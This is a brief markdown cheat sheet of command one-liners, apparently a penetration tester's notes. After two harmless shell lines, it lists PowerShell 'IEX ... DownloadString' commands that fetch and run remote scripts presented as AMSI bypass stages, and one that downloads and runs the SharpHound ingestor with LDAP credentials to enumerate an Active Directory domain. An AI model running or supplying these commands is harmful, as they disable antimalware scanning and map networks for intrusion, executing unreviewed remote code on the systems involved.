# Add text to line
~~~
awk  '{print "http://" $1}' urls.txt
~~~
# Change permissions of folder (Linux)
~~~
sudo chmod +x $(find /PATH/)
~~~
# Stage One (AMSI Techniques)
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
~~~
# Stage Two (AMSI .NET Techniques)
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageTwo.ps1')
~~~
# BloodHound ingestor trough PowerShell
~~~
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound -LdapUsername "Username" -LdapPassword "Password" -Domain "Domain" -DomainController DC-ip -CollectionMethods All -OutputDirectory "C:\TEMP\"
~~~~

